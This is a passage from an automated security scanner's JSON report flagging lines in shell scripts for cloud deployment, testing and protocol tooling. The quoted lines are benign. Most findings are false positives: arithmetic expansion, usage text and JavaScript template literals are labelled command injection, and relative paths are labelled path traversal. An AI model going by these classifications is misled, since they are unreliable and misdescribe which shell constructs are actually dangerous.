        "line_number": 251,
        "issue": "Command substitution in shell",
        "evidence": "local start=$(date +%s.%N)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cloud/aws-lambda-deployment/resources/scripts/test_function.sh",
        "line_number": 273,
        "issue": "Command substitution in shell",
        "evidence": "local status_code=$(jq -r '.StatusCode // 200' \"$response_file\" 2>/dev/null || echo \"200\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cloud/aws-lambda-deployment/resources/scripts/test_function.sh",
        "line_number": 283,
        "issue": "Command substitution in shell",
        "evidence": "local end=$(date +%s.%N)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cloud/aws-lambda-deployment/resources/scripts/test_function.sh",
        "line_number": 284,
        "issue": "Command substitution in shell",
        "evidence": "echo \"duration:$(echo \"$end - $start\" | bc)\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cloud/aws-lambda-deployment/resources/scripts/test_function.sh",
        "line_number": 294,
        "issue": "Command substitution in shell",
        "evidence": "local batch_success=$(jobs -p | wc -l)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cloud/aws-lambda-deployment/resources/scripts/test_function.sh",
        "line_number": 295,
        "issue": "Command substitution in shell",
        "evidence": "total_requests=$((total_requests + concurrency))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cloud/aws-lambda-deployment/resources/scripts/test_function.sh",
        "line_number": 305,
        "issue": "Command substitution in shell",
        "evidence": "successful_requests=$(grep -c \"success\" \"$tmp_dir\"/* 2>/dev/null || echo \"0\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cloud/aws-lambda-deployment/resources/scripts/test_function.sh",
        "line_number": 306,
        "issue": "Command substitution in shell",
        "evidence": "failed_requests=$((total_requests - successful_requests))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cloud/aws-lambda-deployment/resources/scripts/test_function.sh",
        "line_number": 309,
        "issue": "Command substitution in shell",
        "evidence": "total_duration=$(awk '{sum+=$1} END {print sum}' \"$tmp_dir\"/duration_* 2>/dev/null || echo \"0\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cloud/aws-lambda-deployment/resources/scripts/test_function.sh",
        "line_number": 314,
        "issue": "Command substitution in shell",
        "evidence": "avg_duration=$(echo \"scale=3; $total_duration / $successful_requests\" | bc)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cloud/aws-lambda-deployment/resources/scripts/test_function.sh",
        "line_number": 319,
        "issue": "Command substitution in shell",
        "evidence": "success_rate=$(echo \"scale=2; $successful_requests * 100 / $total_requests\" | bc)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cloud/aws-lambda-deployment/resources/scripts/test_function.sh",
        "line_number": 322,
        "issue": "Command substitution in shell",
        "evidence": "local rps=$(echo \"scale=2; $total_requests / $duration\" | bc)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cloud/kubernetes-deployment/resources/scripts/test_deployment.sh",
        "line_number": 94,
        "issue": "Command substitution in shell",
        "evidence": "TESTS_RUN=$((TESTS_RUN + 1))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cloud/kubernetes-deployment/resources/scripts/test_deployment.sh",
        "line_number": 97,
        "issue": "Command substitution in shell",
        "evidence": "TESTS_PASSED=$((TESTS_PASSED + 1))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cloud/kubernetes-deployment/resources/scripts/test_deployment.sh",
        "line_number": 100,
        "issue": "Command substitution in shell",
        "evidence": "TESTS_FAILED=$((TESTS_FAILED + 1))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cloud/kubernetes-deployment/resources/scripts/test_deployment.sh",
        "line_number": 250,
        "issue": "Command substitution in shell",
        "evidence": "deployments=$(kubectl get deployments -n \"$NAMESPACE\" -o jsonpath='{.items[*].metadata.name}')",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cloud/kubernetes-deployment/resources/scripts/test_deployment.sh",
        "line_number": 273,
        "issue": "Command substitution in shell",
        "evidence": "pods=$(kubectl get pods -n \"$NAMESPACE\" -o json)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cloud/kubernetes-deployment/resources/scripts/test_deployment.sh",
        "line_number": 276,
        "issue": "Command substitution in shell",
        "evidence": "total_pods=$(echo \"$pods\" | jq -r '.items | length')",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cloud/kubernetes-deployment/resources/scripts/test_deployment.sh",
        "line_number": 286,
        "issue": "Command substitution in shell",
        "evidence": "for i in $(seq 0 $((total_pods - 1))); do",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cloud/kubernetes-deployment/resources/scripts/test_deployment.sh",
        "line_number": 288,
        "issue": "Command substitution in shell",
        "evidence": "pod_name=$(echo \"$pods\" | jq -r \".items[$i].metadata.name\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cloud/kubernetes-deployment/resources/scripts/test_deployment.sh",
        "line_number": 291,
        "issue": "Command substitution in shell",
        "evidence": "phase=$(echo \"$pods\" | jq -r \".items[$i].status.phase\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cloud/kubernetes-deployment/resources/scripts/test_deployment.sh",
        "line_number": 294,
        "issue": "Command substitution in shell",
        "evidence": "ready=$(echo \"$pods\" | jq -r \".items[$i].status.conditions[] | select(.type==\\\"Ready\\\") | .status\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cloud/kubernetes-deployment/resources/scripts/test_deployment.sh",
        "line_number": 309,
        "issue": "Command substitution in shell",
        "evidence": "services=$(kubectl get services -n \"$NAMESPACE\" -o jsonpath='{.items[*].metadata.name}')",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cloud/kubernetes-deployment/resources/scripts/test_deployment.sh",
        "line_number": 318,
        "issue": "Command substitution in shell",
        "evidence": "endpoints=$(kubectl get endpoints \"$service\" -n \"$NAMESPACE\" -o json | jq -r '.subsets[0].addresses | length')",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cloud/kubernetes-deployment/resources/scripts/test_deployment.sh",
        "line_number": 346,
        "issue": "Command substitution in shell",
        "evidence": "services=$(kubectl get services -n \"$NAMESPACE\" -o jsonpath='{.items[*].metadata.name}')",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cloud/kubernetes-deployment/resources/scripts/test_deployment.sh",
        "line_number": 350,
        "issue": "Command substitution in shell",
        "evidence": "first_service=$(echo \"$services\" | awk '{print $1}')",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cloud/kubernetes-deployment/resources/scripts/test_deployment.sh",
        "line_number": 353,
        "issue": "Unencrypted HTTP",
        "evidence": "if kubectl run test-connection --image=curlimages/curl:7.85.0 --rm -i --restart=Never -n \"$NAMESPACE\" -- curl -s --max-time 10 \"http://${first_service}\" &>/dev/null; then",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cloud/kubernetes-deployment/resources/scripts/test_deployment.sh",
        "line_number": 394,
        "issue": "Command substitution in shell",
        "evidence": "\"success\": $([ \"$TESTS_FAILED\" -eq 0 ] && echo \"true\" || echo \"false\"),",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cloud/kubernetes-deployment/resources/scripts/test_deployment.sh",
        "line_number": 396,
        "issue": "Command substitution in shell",
        "evidence": "$(IFS=,; echo \"${TEST_RESULTS[*]}\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cloud/kubernetes-deployment/resources/scripts/test_deployment.sh",
        "line_number": 421,
        "issue": "Command substitution in shell",
        "evidence": "Usage: $(basename \"$0\") [OPTIONS] MANIFEST_PATH",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cloud/kubernetes-deployment/resources/scripts/test_deployment.sh",
        "line_number": 441,
        "issue": "Command substitution in shell",
        "evidence": "$(basename \"$0\") deployment.yaml",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cloud/kubernetes-deployment/resources/scripts/test_deployment.sh",
        "line_number": 444,
        "issue": "Command substitution in shell",
        "evidence": "$(basename \"$0\") --provider minikube manifests/",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cloud/kubernetes-deployment/resources/scripts/test_deployment.sh",
        "line_number": 447,
        "issue": "Command substitution in shell",
        "evidence": "$(basename \"$0\") --no-cleanup deployment.yaml",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cloud/kubernetes-deployment/resources/scripts/test_deployment.sh",
        "line_number": 450,
        "issue": "Command substitution in shell",
        "evidence": "$(basename \"$0\") --json deployment.yaml",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/testing/integration-testing/resources/scripts/run_integration_tests.sh",
        "line_number": 8,
        "issue": "Command substitution in shell",
        "evidence": "SCRIPT_DIR=\"$(cd \"$(dirname \"${BASH_SOURCE[0]}\")\" && pwd)\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/testing/integration-testing/resources/scripts/run_integration_tests.sh",
        "line_number": 11,
        "issue": "Path traversal pattern",
        "evidence": "DOCKER_COMPOSE_FILE=\"${SCRIPT_DIR}/../examples/docker/docker-compose-test.yml\"",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/testing/integration-testing/resources/scripts/run_integration_tests.sh",
        "line_number": 62,
        "issue": "Command substitution in shell",
        "evidence": "$(basename \"$0\") [OPTIONS]",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/testing/integration-testing/resources/scripts/run_integration_tests.sh",
        "line_number": 81,
        "issue": "Command substitution in shell",
        "evidence": "$(basename \"$0\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/testing/integration-testing/resources/scripts/run_integration_tests.sh",
        "line_number": 84,
        "issue": "Command substitution in shell",
        "evidence": "$(basename \"$0\") --coverage",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/testing/integration-testing/resources/scripts/run_integration_tests.sh",
        "line_number": 87,
        "issue": "Command substitution in shell",
        "evidence": "$(basename \"$0\") --pattern \"test_api_*\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/testing/integration-testing/resources/scripts/run_integration_tests.sh",
        "line_number": 90,
        "issue": "Command substitution in shell",
        "evidence": "$(basename \"$0\") --parallel --test-dir tests/integration/api",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/testing/integration-testing/resources/scripts/run_integration_tests.sh",
        "line_number": 93,
        "issue": "Command substitution in shell",
        "evidence": "$(basename \"$0\") --keep-infra --verbose",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/testing/integration-testing/resources/scripts/run_integration_tests.sh",
        "line_number": 96,
        "issue": "Command substitution in shell",
        "evidence": "$(basename \"$0\") --json",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/testing/integration-testing/resources/scripts/run_integration_tests.sh",
        "line_number": 99,
        "issue": "Command substitution in shell",
        "evidence": "$(basename \"$0\") --db-type mysql",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/testing/integration-testing/resources/scripts/run_integration_tests.sh",
        "line_number": 340,
        "issue": "Command substitution in shell",
        "evidence": "framework=$(detect_test_framework)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/testing/integration-testing/resources/scripts/run_integration_tests.sh",
        "line_number": 370,
        "issue": "Command substitution in shell",
        "evidence": "\"success\": $([ \"$exit_code\" -eq 0 ] && echo \"true\" || echo \"false\"),",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/testing/integration-testing/resources/scripts/run_integration_tests.sh",
        "line_number": 377,
        "issue": "Command substitution in shell",
        "evidence": "\"timestamp\": \"$(date -u +\"%Y-%m-%dT%H:%M:%SZ\")\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/realtime/websocket-implementation/resources/scripts/analyze_traffic.sh",
        "line_number": 233,
        "issue": "Privilege escalation",
        "evidence": "timeout \"${duration}s\" sudo tcpdump -i \"$interface\" -w \"$output\" -s 0 \"$filter\" 2>&1 | while read -r line; do",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/realtime/websocket-implementation/resources/scripts/analyze_traffic.sh",
        "line_number": 240,
        "issue": "Privilege escalation",
        "evidence": "sudo tcpdump -i \"$interface\" -w \"$output\" -s 0 \"$filter\"",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/realtime/websocket-implementation/resources/scripts/analyze_traffic.sh",
        "line_number": 255,
        "issue": "Command substitution in shell",
        "evidence": "total_packets=$(tcpdump -r \"$file\" 2>/dev/null | wc -l)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/realtime/websocket-implementation/resources/scripts/analyze_traffic.sh",
        "line_number": 291,
        "issue": "Command substitution in shell",
        "evidence": "handshakes=$(tshark -r \"$file\" -Y \"http.upgrade contains WebSocket\" 2>/dev/null | wc -l)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/realtime/websocket-implementation/resources/scripts/analyze_traffic.sh",
        "line_number": 298,
        "issue": "Command substitution in shell",
        "evidence": "frames=$(tshark -r \"$file\" -Y \"websocket\" 2>/dev/null | wc -l)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/realtime/websocket-implementation/resources/scripts/analyze_traffic.sh",
        "line_number": 348,
        "issue": "Command substitution in shell",
        "evidence": "total_packets=$(tcpdump -r \"$file\" 2>/dev/null | wc -l)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/realtime/websocket-implementation/resources/scripts/analyze_traffic.sh",
        "line_number": 354,
        "issue": "Command substitution in shell",
        "evidence": "handshakes=$(tshark -r \"$file\" -Y \"http.upgrade contains WebSocket\" 2>/dev/null | wc -l)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/realtime/websocket-implementation/resources/scripts/analyze_traffic.sh",
        "line_number": 355,
        "issue": "Command substitution in shell",
        "evidence": "frames=$(tshark -r \"$file\" -Y \"websocket\" 2>/dev/null | wc -l)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/realtime/websocket-implementation/resources/scripts/analyze_traffic.sh",
        "line_number": 366,
        "issue": "Command substitution in shell",
        "evidence": "\"timestamp\": \"$(date -u +%Y-%m-%dT%H:%M:%SZ)\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/realtime/websocket-implementation/resources/scripts/analyze_traffic.sh",
        "line_number": 379,
        "issue": "Command substitution in shell",
        "evidence": "OUTPUT_FILE=\"ws_capture_$(date +%Y%m%d_%H%M%S).pcap\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/realtime/websocket-implementation/resources/scripts/analyze_traffic.sh",
        "line_number": 410,
        "issue": "Command substitution in shell",
        "evidence": "filter=$(build_filter)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/http2-multiplexing/resources/scripts/test_server_push.sh",
        "line_number": 147,
        "issue": "Command substitution in shell",
        "evidence": "response=$(curl -sI --http2 --max-time \"$TIMEOUT\" \"$URL\" 2>&1 || true)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/http2-multiplexing/resources/scripts/test_server_push.sh",
        "line_number": 164,
        "issue": "Command substitution in shell",
        "evidence": "tmpfile=$(mktemp)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/http2-multiplexing/resources/scripts/test_server_push.sh",
        "line_number": 170,
        "issue": "Command substitution in shell",
        "evidence": "pushed_resources=$(grep -i \"< link:\" \"$tmpfile\" | grep -i \"preload\" || true)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/http2-multiplexing/resources/scripts/test_server_push.sh",
        "line_number": 196,
        "issue": "Command substitution in shell",
        "evidence": "tmpfile=$(mktemp)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/http2-multiplexing/resources/scripts/test_server_push.sh",
        "line_number": 203,
        "issue": "Command substitution in shell",
        "evidence": "push_promises=$(grep \"PUSH_PROMISE\" \"$tmpfile\" || true)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/http2-multiplexing/resources/scripts/test_server_push.sh",
        "line_number": 216,
        "issue": "Command substitution in shell",
        "evidence": "pushed_paths=$(grep -A 5 \"PUSH_PROMISE\" \"$tmpfile\" | grep \":path:\" | awk '{print $3}' || true)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/http2-multiplexing/resources/scripts/test_server_push.sh",
        "line_number": 234,
        "issue": "Command substitution in shell",
        "evidence": "tmpfile=$(mktemp)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/http2-multiplexing/resources/scripts/test_server_push.sh",
        "line_number": 238,
        "issue": "Command substitution in shell",
        "evidence": "time_with_push=$( (time curl -s --http2 --max-time \"$TIMEOUT\" \"$URL\" > /dev/null) 2>&1 | grep real | awk '{print $2}')",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/http2-multiplexing/resources/scripts/test_server_push.sh",
        "line_number": 242,
        "issue": "Command substitution in shell",
        "evidence": "time_without_push=$( (time curl -s --http1.1 --max-time \"$TIMEOUT\" \"$URL\" > /dev/null) 2>&1 | grep real | awk '{print $2}')",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/http2-multiplexing/resources/scripts/test_server_push.sh",
        "line_number": 258,
        "issue": "Command substitution in shell",
        "evidence": "link_header=$(curl -sI --http2 --max-time \"$TIMEOUT\" \"$URL\" | grep -i \"^link:\" | head -1 || true)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/http2-multiplexing/resources/scripts/test_server_push.sh",
        "line_number": 267,
        "issue": "Command substitution in shell",
        "evidence": "pushed_resource=$(echo \"$link_header\" | sed -n 's/.*<\\([^>]*\\)>.*/\\1/p' | head -1)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/http2-multiplexing/resources/scripts/test_server_push.sh",
        "line_number": 276,
        "issue": "Command substitution in shell",
        "evidence": "base_url=$(echo \"$URL\" | sed 's/\\(https\\?:\\/\\/[^/]*\\).*/\\1/')",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/http2-multiplexing/resources/scripts/test_server_push.sh",
        "line_number": 283,
        "issue": "Command substitution in shell",
        "evidence": "cache_control=$(curl -sI --http2 --max-time \"$TIMEOUT\" \"$full_url\" | grep -i \"^cache-control:\" || true)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/http2-multiplexing/resources/scripts/test_server_push.sh",
        "line_number": 325,
        "issue": "Command substitution in shell",
        "evidence": "\"timestamp\": \"$(date -u +%Y-%m-%dT%H:%M:%SZ)\",",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/mqtt-messaging/resources/examples/tls/generate_certs.sh",
        "line_number": 74,
        "issue": "Command substitution in shell",
        "evidence": "echo \"  cafile $(pwd)/ca.crt\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/mqtt-messaging/resources/examples/tls/generate_certs.sh",
        "line_number": 75,
        "issue": "Command substitution in shell",
        "evidence": "echo \"  certfile $(pwd)/server.crt\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/mqtt-messaging/resources/examples/tls/generate_certs.sh",
        "line_number": 76,
        "issue": "Command substitution in shell",
        "evidence": "echo \"  keyfile $(pwd)/server.key\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/mqtt-messaging/resources/examples/tls/generate_certs.sh",
        "line_number": 81,
        "issue": "Command substitution in shell",
        "evidence": "echo \"    --cafile $(pwd)/ca.crt \\\\\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/mqtt-messaging/resources/examples/tls/generate_certs.sh",
        "line_number": 82,
        "issue": "Command substitution in shell",
        "evidence": "echo \"    --cert $(pwd)/client.crt \\\\\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/mqtt-messaging/resources/examples/tls/generate_certs.sh",
        "line_number": 83,
        "issue": "Command substitution in shell",
        "evidence": "echo \"    --key $(pwd)/client.key\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/mqtt-messaging/resources/examples/tls/generate_certs.sh",
        "line_number": 87,
        "issue": "Command substitution in shell",
        "evidence": "echo \"    --cafile $(pwd)/ca.crt \\\\\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/mqtt-messaging/resources/examples/tls/generate_certs.sh",
        "line_number": 88,
        "issue": "Command substitution in shell",
        "evidence": "echo \"    --cert $(pwd)/client.crt \\\\\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/mqtt-messaging/resources/examples/tls/generate_certs.sh",
        "line_number": 89,
        "issue": "Command substitution in shell",
        "evidence": "echo \"    --key $(pwd)/client.key\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/protobuf-schemas/resources/examples/generate_code_python.sh",
        "line_number": 12,
        "issue": "Command substitution in shell",
        "evidence": "SCRIPT_DIR=\"$(cd \"$(dirname \"${BASH_SOURCE[0]}\")\" && pwd)\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/protocols/protobuf-schemas/resources/examples/generate_code_python.sh",
        "line_number": 29,
        "issue": "Path traversal pattern",
        "evidence": "#   ../scripts/generate_proto_code.py --proto-file user_service.proto --language python",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/protobuf-schemas/resources/examples/generate_code_python.sh",
        "line_number": 41,
        "issue": "Command substitution in shell",
        "evidence": "lines=$(wc -l < \"${file}\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/protocols/protobuf-schemas/resources/examples/generate_code_python.sh",
        "line_number": 47,
        "issue": "Path traversal pattern",
        "evidence": "\"${SCRIPT_DIR}/../scripts/generate_proto_code.py\" \\",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/protobuf-schemas/resources/examples/generate_code_typescript.sh",
        "line_number": 12,
        "issue": "Command substitution in shell",
        "evidence": "SCRIPT_DIR=\"$(cd \"$(dirname \"${BASH_SOURCE[0]}\")\" && pwd)\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/protobuf-schemas/resources/examples/generate_code_typescript.sh",
        "line_number": 46,
        "issue": "Command substitution in shell",
        "evidence": "lines=$(wc -l < \"${file}\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/protobuf-schemas/resources/examples/generate_code_typescript.sh",
        "line_number": 110,
        "issue": "Backtick command execution",
        "evidence": "console.log(`Serialized: ${bytes.length} bytes`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/protobuf-schemas/resources/examples/generate_code_typescript.sh",
        "line_number": 114,
        "issue": "Backtick command execution",
        "evidence": "console.log(`Deserialized: ${user2.getEmail()}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/protobuf-schemas/resources/examples/generate_code_typescript.sh",
        "line_number": 129,
        "issue": "Backtick command execution",
        "evidence": "console.log(`Created user: ${user.getId()}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/protobuf-schemas/resources/examples/generate_code_go.sh",
        "line_number": 12,
        "issue": "Command substitution in shell",
        "evidence": "SCRIPT_DIR=\"$(cd \"$(dirname \"${BASH_SOURCE[0]}\")\" && pwd)\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/protobuf-schemas/resources/examples/generate_code_go.sh",
        "line_number": 43,
        "issue": "Command substitution in shell",
        "evidence": "lines=$(wc -l < \"${file}\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
